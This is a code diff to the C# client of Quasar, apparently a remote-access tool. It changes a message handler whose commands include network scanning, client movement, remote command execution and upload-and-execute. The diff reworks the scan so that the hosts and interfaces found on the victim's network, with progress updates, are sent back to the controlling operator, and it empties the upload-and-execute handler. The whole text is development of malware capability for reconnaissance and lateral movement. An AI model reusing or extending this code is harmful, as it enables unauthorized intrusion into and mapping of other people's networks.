@@ -23,28 +23,8 @@ using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
-    public class NetworkHandler : IMessageProcessor, IDisposable
+    public class NetworkHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
-
-        private readonly WebClient _webClient;
-
-        public NetworkHandler(QuasarClient client)
-        {
-            _client = client;
-            _client.ClientState += OnClientStateChange;
-            _webClient = new WebClient { Proxy = null };
-        }
-
-        private void OnClientStateChange(Networking.Client s, bool connected)
-        {
-            if (!connected)
-            {
-                if (_webClient.IsBusy)
-                    _webClient.CancelAsync();
-            }
-        }
-
         public bool CanExecute(IMessage message) => message is DoNetworkScan ||
                                                     message is DoClientMovement ||
                                                     message is DoRemoteCommandExecute ||
@@ -79,19 +59,18 @@ namespace Quasar.Client.Messages
         {
             Task.Run(() =>
             {
-                MessageBox.Show($"Beginning scan on {message.nic.Name}");
-                try
+                ScannerHelper.ScanInterfaceAction(message.nic,
+                (addressEntity, nicEntity) =>
                 {
-                    ScannerHelper.ScanInterfaceAction(message.nic, (addressEntity, nicEntity) =>
-                    {
-                        client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
-                        MessageBox.Show($"Added new network entity: {addressEntity.Address}");
-                    }, client);
-                }
-                catch (Exception ex)
+                    client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
+                    MessageBox.Show($"Added new network entity: {addressEntity.Address}");
+                },
+                (totalInterfaces, targetInterfaceIndex, totalIps, remainingIps) =>
                 {
-                    MessageBox.Show(ex.ToString());
-                }
+                    //Dont forget, targetInterfaceIndex is actually targetInterfaceIndex + 1
+                    client.Send(new DoNetworkScanProgress { NetworkInterfaces = totalInterfaces, InterfaceIndex = targetInterfaceIndex, Addresses = totalIps, CurrentAddress = remainingIps });
+                });
+                client.Send(new DoNetworkScanProgress { Addresses = 0 }); // Complete
             });
         }
 
@@ -120,23 +99,7 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoUploadAndExecute message)
         {
-             
-        }
 
-        public void Dispose()
-        {
-            Dispose(true);
-            GC.SuppressFinalize(this);
-        }
-
-        protected virtual void Dispose(bool deposing)
-        {
-            if (deposing)
-            {
-                _client.ClientState -= OnClientStateChange;
-                _webClient.CancelAsync();
-                _webClient.Dispose();
-            }
         }
     }
 }
